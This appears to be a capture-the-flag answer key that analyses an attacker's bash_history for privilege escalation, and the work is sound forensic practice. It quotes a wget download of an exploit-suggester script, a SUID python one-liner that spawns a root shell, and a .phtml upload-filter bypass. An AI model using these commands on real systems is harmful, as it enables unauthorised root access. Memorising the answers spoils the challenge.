### Log Analysis - Privilege Escalation

#### Challenge Submission

> Log Analysis File ->  bash_history

**Q1**: What user (other than ‘root’) is present on the server?

**A1**: daniel 

>  According to this cmd -> cd /home/daniel/

**Q2**: What script did the attacker try to download to the server?

**A2**: linux-exploit-suggester.sh 

>  According to this cmd -> wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

**Q3** : What packet analyzer tool did the attacker try to use?

**A3**: tcpdump

**Q4**: What file extension did the attacker use to bypass the file upload filter implemented by the developer?

**A4**: .phtml

**Q5**: Based on the commands run by the attacker before removing the php shell, what misconfiguration was exploited in the ‘python’ binary to gain root-level access? 1- Reverse Shell ; 2- File Upload ; 3- File Write ; 4- SUID ; 5- Library load

**A5**: 4- SUID

> According to this cmd -> ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

 Ref Link: https://gtfobins.github.io/,  https://payatu.com/guide-linux-privilege-escalation